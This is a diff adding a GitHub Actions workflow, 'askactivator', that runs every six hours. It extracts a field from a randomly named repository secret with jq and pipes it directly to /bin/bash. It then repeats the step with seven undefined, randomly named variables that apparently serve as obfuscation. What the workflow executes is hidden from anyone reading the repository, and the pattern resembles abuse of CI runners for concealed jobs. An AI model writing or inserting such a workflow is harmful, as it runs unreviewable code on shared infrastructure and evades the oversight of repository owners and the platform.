@@ -1,0 +1,24 @@
+name: askactivator
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: askactivator
+        env:
+          dgpr72868: ${{ secrets.dgpr72868 }}
+        run: |
+          echo $dgpr72868 | jq -r .cesem55384 | /bin/bash
+          echo $mlus87 | jq -r .thne01537 | /bin/bash
+          echo $ron359 | jq -r .pt76 | /bin/bash
+          echo $ujd786 | jq -r .ls609 | /bin/bash
+          echo $xul04423 | jq -r .e4 | /bin/bash
+          echo $d051 | jq -r .jhacs41 | /bin/bash
+          echo $ppghm7 | jq -r .mmr1518 | /bin/bash
+          echo $eujir95 | jq -r .axd85711 | /bin/bash
+
